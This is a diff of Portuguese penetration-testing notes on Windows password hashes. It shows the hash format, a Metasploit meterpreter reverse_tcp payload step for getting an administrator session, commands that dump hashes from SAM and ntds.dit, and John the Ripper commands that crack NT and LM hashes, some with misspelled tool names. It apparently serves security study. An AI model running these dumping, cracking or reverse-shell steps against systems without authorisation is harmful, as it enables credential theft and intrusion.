@@ -1,5 +1,6 @@
-## Windows Hashes
+# Windows Hashes
 
+## Padrão de Hash do Windows
 ``<Username>:<User ID>:<LM hash>:<NT hash>:<Comment>:<Home Dir>:``
 LM Hash vazio: aad3b435b51404eeaad3b435b51404ee
 
@@ -70,9 +71,9 @@ Agora definimos o payload com ``set payload windows/x64/meterpreter/reverse_tcp`
 
 Execute o comando ``exploit`` e aguarde o inicio de uma nova sessão com os privilégios de administrador.
 
-## Quebra de hashes Windows
+## Visualizar Hashes
 
-Para visualizar os hashes que estão nos arquivos utilize uma das opções:
+Para visualizar os hashes que estão nos arquivos sam e ntds.dit utilize uma das opções:
 
 **Windows 2k/NT/XP/Vista**
 ``samdump2 SYSTEM SAM``
@@ -83,6 +84,12 @@ Para visualizar os hashes que estão nos arquivos utilize uma das opções:
 **Windows Server**
 ``impacket-secretdump -ntds ntds.dit -system SYSTEM LOCAL``
 
+## Quebra de Hashes
 
+Para realizar a quebra dos hashes podemos utilizar a ferramenta john The Ripper.
 
+**Quebra de Hash sem LM** *(aad3b435b51404eeaad3b435b51404ee)***:**
+``jhon --format=nt hash``
 
+**Quebra de Hash com LM:**
+``jhon --format=lm hash``
